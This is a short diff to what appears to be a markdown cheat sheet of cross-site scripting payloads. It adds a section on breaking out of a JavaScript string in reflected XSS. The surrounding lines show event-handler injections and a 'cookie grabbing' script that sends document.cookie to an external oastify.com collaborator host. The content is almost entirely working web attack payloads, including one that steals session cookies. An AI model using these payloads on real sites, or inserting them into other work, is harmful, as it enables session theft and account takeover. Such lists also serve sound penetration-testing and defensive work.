@@ -18,6 +18,11 @@ xss&lt;script&gt;alert&#40;1337&#41;&lt;&#47;script&gt;
 " autofocus onfocus="alert(1337)
 "onmouseover="alert(1)
 ```
+### Reflected XSS into a JavaScript string with angle brackets HTML encoded
+```js
+<xss>'"
+xss';alert(1);'xss
+```
 #### For cookie grabbing.
 ```js
 <script>document.location='https://r91uwnam29s3c1jdsyc8t7t34ualyfm4.oastify.com//'+document.cookie</script> 
